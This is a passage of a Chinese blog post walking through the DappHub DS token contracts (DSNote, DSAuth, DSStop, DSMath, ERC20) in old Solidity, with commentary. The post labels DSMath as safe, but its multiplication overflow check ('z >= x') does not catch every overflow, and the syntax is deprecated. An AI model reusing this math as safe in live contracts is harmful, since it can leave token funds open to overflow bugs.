target=\"_blank\" rel=\"noopener\">DSToken</a></h3><p>6.1 DSTokenBase</p>\n<p>继承 <code>ERC20 / DSMath</code> 合约。实现了抽象函数中的方法，完成了代币的基础功能。</p>\n<p>6.2 DSToken</p>\n<p>具体代币的合约，实际的交互合约。</p>\n<ul>\n<li>以上与所链接的文档有些许差别。</li>\n</ul>\n<h2 id=\"合约代码阅读\"><a href=\"#合约代码阅读\" class=\"headerlink\" title=\"合约代码阅读\"></a>合约代码阅读</h2><h3 id=\"1-DSNote-1\"><a href=\"#1-DSNote-1\" class=\"headerlink\" title=\"1. DSNote\"></a>1. DSNote</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 记录的合约</span><br><span class=\"line\">contract DSNote &#123;</span><br><span class=\"line\">    /*</span><br><span class=\"line\">    记录 事件 声明了 anonymous，使用了 indexed</span><br><span class=\"line\">    */ </span><br><span class=\"line\">    event LogNote(</span><br><span class=\"line\">        bytes4   indexed  sig,</span><br><span class=\"line\">        address  indexed  guy,</span><br><span class=\"line\">        bytes32  indexed  foo,</span><br><span class=\"line\">        bytes32  indexed  bar,</span><br><span class=\"line\">\tuint\t \t  wad,</span><br><span class=\"line\">        bytes             fax</span><br><span class=\"line\">    ) anonymous;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 修饰器</span><br><span class=\"line\">    modifier note &#123;</span><br><span class=\"line\">        bytes32 foo;</span><br><span class=\"line\">        bytes32 bar;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 内联汇编</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // := 赋值</span><br><span class=\"line\">            // calldataload(p) : 从 p 位置开始调用数据 (32 bytes)</span><br><span class=\"line\">            foo := calldataload(4)</span><br><span class=\"line\">            bar := calldataload(36)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 触发 记录事件</span><br><span class=\"line\">        LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);</span><br><span class=\"line\"></span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据<a href=\"https://solidity.readthedocs.io/en/latest/contracts.html#events\" target=\"_blank\" rel=\"noopener\"><code>event</code> 的文档描述</a>：</p>\n<blockquote>\n<p>Up to three parameters can receive the attribute <code>indexed</code> which will cause the respective arguments to be searched for: It is possible to filter for specific values of indexed arguments in the user interface.</p>\n</blockquote>\n<p>最多只能有三个参数可以接受 <code>indexed</code> 属性，不知道为什么此处有 4 个。<code>indexed</code> 指定的参数可以在用户界面中被搜索。</p>\n<p><code>anonymous</code> 的声明，<a href=\"https://solidity.readthedocs.io/en/latest/contracts.html#events\" target=\"_blank\" rel=\"noopener\"><code>event</code> 的文档描述</a>：</p>\n<blockquote>\n<p>The hash of the signature of the event is one of the topics except if you declared the event with <code>anonymous</code> specifier. This means that it is not possible to filter for specific anonymous events by name.</p>\n<p>除非你使用 <code>anonymous</code> 声明事件，否则事件签名的哈希值将成为 topic 之一。意思是无法通过名称筛选指定的 <code>anonymous</code> 事件。</p>\n</blockquote>\n<p><a href=\"https://solidity.readthedocs.io/en/latest/assembly.html#inline-assembly\" target=\"_blank\" rel=\"noopener\"><code>assembly</code> 的文档描述</a>：</p>\n<blockquote>\n<p>函数式赋值, 如 x := add(y, 3)</p>\n</blockquote>\n<p><a href=\"https://solidity.readthedocs.io/en/latest/assembly.html#opcodes\" target=\"_blank\" rel=\"noopener\"><code>opcodes</code> 的文档描述</a>：</p>\n<blockquote>\n<p>calldataload(p) : 从 p 位置开始调用数据 (32 bytes)</p>\n</blockquote>\n<p><code>foo, bar</code> 两个参数，一直是当前调用函数相关的值。</p>\n<h3 id=\"2-DSAuthority\"><a href=\"#2-DSAuthority\" class=\"headerlink\" title=\"2. DSAuthority\"></a>2. DSAuthority</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract DSAuthority &#123;</span><br><span class=\"line\">    // 函数未实现</span><br><span class=\"line\">    function canCall(</span><br><span class=\"line\">        address src, address dst, bytes4 sig</span><br><span class=\"line\">    ) constant returns (bool);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是一个抽象合约，<code>canCall</code> 函数未实现。<code>constant</code> 表示函数不会对合约状态进行修改。</p>\n<h3 id=\"3-DSAuthEvents\"><a href=\"#3-DSAuthEvents\" class=\"headerlink\" title=\"3. DSAuthEvents\"></a>3. DSAuthEvents</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract DSAuthEvents &#123;</span><br><span class=\"line\">    // 记录验证 事件</span><br><span class=\"line\">    event LogSetAuthority (address indexed authority);</span><br><span class=\"line\">    // 记录主人 事件</span><br><span class=\"line\">    event LogSetOwner     (address indexed owner);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>只包含了两个事件的声明。当用户设置 <code>authority / owner</code> 时会触发。</p>\n<h3 id=\"4-DSAuth\"><a href=\"#4-DSAuth\" class=\"headerlink\" title=\"4. DSAuth\"></a>4. DSAuth</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 认证合约</span><br><span class=\"line\">// `is` 表示继承了 `DSAuthEvents`</span><br><span class=\"line\">contract DSAuth is DSAuthEvents &#123;</span><br><span class=\"line\">    DSAuthority  public  authority;</span><br><span class=\"line\">    address      public  owner;</span><br><span class=\"line\">  </span><br><span class=\"line\">    // 修饰器</span><br><span class=\"line\">    modifier auth &#123;</span><br><span class=\"line\">        // isAuthorized() 为 true</span><br><span class=\"line\">        assert(isAuthorized(msg.sender, msg.sig));</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 修饰器 未被使用到</span><br><span class=\"line\">    modifier authorized(bytes4 sig) &#123;</span><br><span class=\"line\">    \t// isAuthorized() 为 true</span><br><span class=\"line\">        assert(isAuthorized(msg.sender, sig));</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    // 构造函数，设置 owner</span><br><span class=\"line\">    function DSAuth() &#123;</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">        LogSetOwner(msg.sender);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 验证函数</span><br><span class=\"line\">    function assert(bool x) internal &#123;</span><br><span class=\"line\">        if (!x) throw;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 通过 auth 验证，设置 owner，触发事件</span><br><span class=\"line\">    function setOwner(address owner_) auth</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        owner = owner_;</span><br><span class=\"line\">        LogSetOwner(owner);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 通过 auth 验证，设置 authority，触发事件</span><br><span class=\"line\">    function setAuthority(DSAuthority authority_) auth</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        authority = authority_;</span><br><span class=\"line\">        LogSetAuthority(authority);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 认证函数 根据 src 和 authority 的情况来返回操作结果</span><br><span class=\"line\">    function isAuthorized(address src, bytes4 sig) internal returns (bool) &#123;</span><br><span class=\"line\">        if (src == address(this)) &#123; </span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        &#125; else if (src == owner) &#123; </span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        &#125; else if (authority == DSAuthority(0)) &#123; </span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return authority.canCall(src, this, sig);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>合约继承了认证事件。合约主要用来对认证部分进行处理。在设置 owner 和 authority 之前，触发 auth 修饰器，通过函数 <code>isAuthorized()</code> 来对消息发送者 <code>msg</code> 进行验证。消息发送者 <code>msg</code> 包含：</p>\n<p>4.1 <code>msg.data(bytes)</code>：完整的调用数据<br>4.2 <code>msg.gas(uint)</code>：剩余燃气 - 在版本 0.4.21 中废弃并由 <code>gasleft()</code> 取代<br>4.3 <code>msg.sender(address)</code>：当前消息的发送者<br>4.4 <code>msg.sig(bytes4)</code>：调用数据的前四个字节（即函数的标识符）<br>4.5 <code>msg.value(uint)</code>：伴随消息发送的 wei 的数值</p>\n<p>函数 <code>isAuthorized()</code> 是 <code>internal</code> 内部函数，只能在内部或者派生的合约中被调用，无需使用 <code>this</code>。首先将 <code>src</code> 与 <code>this</code> 的地址进行比较，如果为 <code>true</code> 则返回 <code>true</code>。<a href=\"https://solidity.readthedocs.io/en/latest/units-and-global-variables.html#contract-related\" target=\"_blank\" rel=\"noopener\"><code>this</code> 的定义</a>是：</p>\n<blockquote>\n<p><code>this</code> (current contract’s type): the current contract, explicitly convertible to Address</p>\n<p>当前合约的类型：当前的合约，显式转换为地址。</p>\n</blockquote>\n<p>然后比较 <code>src</code> 与 <code>owner</code>，如果为 <code>true</code> 返回 <code>true</code>。构造函数中 <code>owner</code> 就是部署合约的用户地址，因为构造函数只设置了 <code>owner</code>，所以默认只用操作 <code>owner</code>，到此就截止了。</p>\n<p>然后比较 <code>authority</code> 与 <code>DSAuthority(0)</code>。<code>DSAuthority(0)</code> 表示将 0 强制转换成 <code>DSAuthority</code> 类型，此时与 <code>authority</code> 进行比较，如果相等，则说明 <code>authority</code> 未被赋值。因为任何变量如果没有被赋值，那么它的初始值就是 0。所以相等，说明未被赋值过，返回 false。而如果比较结果为 false，则说明使用了 <code>authority</code> 变量，那么可以进行下一步了，即调用 <code>authority.canCall(src, this, sig)</code> 并返回其结果。此处 <code>canCall</code> 函数并没有被实现，但是提供了一个接口给用户，如果用户想要使用，只需要继承 <code>DSAuthority</code>，然后实现该函数，然后使用该继承的合约即可。</p>\n<h3 id=\"5-DSStop\"><a href=\"#5-DSStop\" class=\"headerlink\" title=\"5. DSStop\"></a>5. DSStop</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 停止合约</span><br><span class=\"line\">contract DSStop is DSAuth, DSNote &#123;</span><br><span class=\"line\">    // 停止标识符</span><br><span class=\"line\">    bool public stopped;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 修饰器 检测停止标识符</span><br><span class=\"line\">    modifier stoppable &#123;</span><br><span class=\"line\">        assert (!stopped);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 停止函数</span><br><span class=\"line\">    function stop() auth note &#123;</span><br><span class=\"line\">        stopped = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 启动函数</span><br><span class=\"line\">    function start() auth note &#123;</span><br><span class=\"line\">        stopped = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>继承了 <code>DSAuth / DSNote</code> 合约。定义了 <code>stoppable</code> 检测众筹是否停止。定义了两个函数，分别用来设置停止标识符，表示启动或结束，设置的时候通过 <code>auth</code> 来进行权限验证，<code>note</code> 来触发变更。</p>\n<h3 id=\"6-DSMath\"><a href=\"#6-DSMath\" class=\"headerlink\" title=\"6. DSMath\"></a>6. DSMath</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 安全的数学运算</span><br><span class=\"line\">contract DSMath &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    /*</span><br><span class=\"line\">    标准 uint256 函数 256 位无符号数 即 非负整数 0 ~ 2^256 - 1</span><br><span class=\"line\"></span><br><span class=\"line\">    constant 表示不会改变状态变量</span><br><span class=\"line\">    internal 表示只会被本合约和继承了的合约所使用</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    // 加法</span><br><span class=\"line\">    function add(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        assert((z = x + y) &gt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 减法</span><br><span class=\"line\">    function sub(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        assert((z = x - y) &lt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 乘法</span><br><span class=\"line\">    function mul(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        assert((z = x * y) &gt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 除法 当除以 0 时，solidity 会自动抛出异常</span><br><span class=\"line\">    function div(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        z = x / y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 返回较小值</span><br><span class=\"line\">    function min(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        return x &lt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 返回较大值</span><br><span class=\"line\">    function max(uint256 x, uint256 y) constant internal returns (uint256 z) &#123;</span><br><span class=\"line\">        return x &gt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*</span><br><span class=\"line\">    uint128 functions (h is for half) 由 256 位变为 128 位 其余同上</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        assert((z = x + y) &gt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        assert((z = x - y) &lt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        assert((z = x * y) &gt;= x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = x / y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        return x &lt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        return x &gt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    /*</span><br><span class=\"line\">    int256 functions 有符号 256 位函数</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    function imin(int256 x, int256 y) constant internal returns (int256 z) &#123;</span><br><span class=\"line\">        return x &lt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function imax(int256 x, int256 y) constant internal returns (int256 z) &#123;</span><br><span class=\"line\">        return x &gt;= y ? x : y;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*</span><br><span class=\"line\">    WAD math 提供 18 位精度，同上 乘法和除法加入 WAD</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    uint128 constant WAD = 10 ** 18;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wadd(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hadd(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wsub(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hsub(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = cast((uint256(x) * y + WAD / 2) / WAD);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = cast((uint256(x) * WAD + y / 2) / y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function wmin(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hmin(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function wmax(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hmax(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /*</span><br><span class=\"line\">    RAY math 同上，但是精度不同 为 10 ** 27</span><br><span class=\"line\">     */</span><br><span class=\"line\"></span><br><span class=\"line\">    uint128 constant RAY = 10 ** 27;</span><br><span class=\"line\"></span><br><span class=\"line\">    function radd(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hadd(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function rsub(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hsub(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = cast((uint256(x) * y + RAY / 2) / RAY);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        z = cast((uint256(x) * RAY + y / 2) / y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 指数运算</span><br><span class=\"line\">    function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        // This famous algorithm is called &quot;exponentiation by squaring&quot;</span><br><span class=\"line\">        // and calculates x^n with x as fixed-point and n as regular unsigned.</span><br><span class=\"line\">        //</span><br><span class=\"line\">        // It&apos;s O(log n), instead of O(n) for naive repeated multiplication.</span><br><span class=\"line\">        //</span><br><span class=\"line\">        // These facts are why it works:</span><br><span class=\"line\">        //</span><br><span class=\"line\">        //  If n is even, then x^n = (x^2)^(n/2).</span><br><span class=\"line\">        //  If n is odd,  then x^n = x * x^(n-1),</span><br><span class=\"line\">        //   and applying the equation for even x gives</span><br><span class=\"line\">        //    x^n = x * (x^2)^((n-1) / 2).</span><br><span class=\"line\">        //</span><br><span class=\"line\">        //  Also, EVM division is flooring and</span><br><span class=\"line\">        //    floor[(n-1) / 2] = floor[n / 2].</span><br><span class=\"line\"></span><br><span class=\"line\">        z = n % 2 != 0 ? x : RAY;</span><br><span class=\"line\"></span><br><span class=\"line\">        for (n /= 2; n != 0; n /= 2) &#123;</span><br><span class=\"line\">            x = rmul(x, x);</span><br><span class=\"line\"></span><br><span class=\"line\">            if (n % 2 != 0) &#123;</span><br><span class=\"line\">                z = rmul(z, x);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function rmin(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hmin(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function rmax(uint128 x, uint128 y) constant internal returns (uint128) &#123;</span><br><span class=\"line\">        return hmax(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // x 的 uint256 类型可以无损被转换成 uint128 类型</span><br><span class=\"line\">    function cast(uint256 x) constant internal returns (uint128 z) &#123;</span><br><span class=\"line\">        assert((z = uint128(x)) == x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"7-ERC20\"><a href=\"#7-ERC20\" class=\"headerlink\" title=\"7. ERC20\"></a>7. ERC20</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ERC20 抽象合约 接口</span><br><span class=\"line\">contract ERC20 &#123;</span><br><span class=\"line\">    // 代币总量</span><br><span class=\"line\">    function totalSupply() constant returns (uint supply);</span><br><span class=\"line\">    // 用户资产</span><br><span class=\"line\">    function balanceOf(address who) 